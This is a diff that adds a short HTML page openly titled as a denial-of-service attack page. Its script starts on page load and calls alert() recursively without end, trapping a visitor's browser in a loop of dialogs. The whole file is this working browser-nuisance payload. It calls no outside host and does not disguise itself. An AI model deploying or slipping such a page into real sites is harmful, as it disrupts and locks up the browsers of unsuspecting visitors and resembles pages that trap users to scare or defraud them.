@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Denial of Service: Endless Alerts</title>
+    <script>
+        function endlessAlerts() {
+            alert("You've been trapped in an endless loop of alerts! Click OK if you dare...");
+            endlessAlerts(); // Recursively call the function to create an infinite loop
+        }
+
+        window.onload = function() {
+            endlessAlerts(); // Start the endless alerts when the page loads
+        }
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Denial of Service Attack Page</h1>
+    <p>If you see this message, it means the endless alerts are already running!</p>
+</body>
+</html>
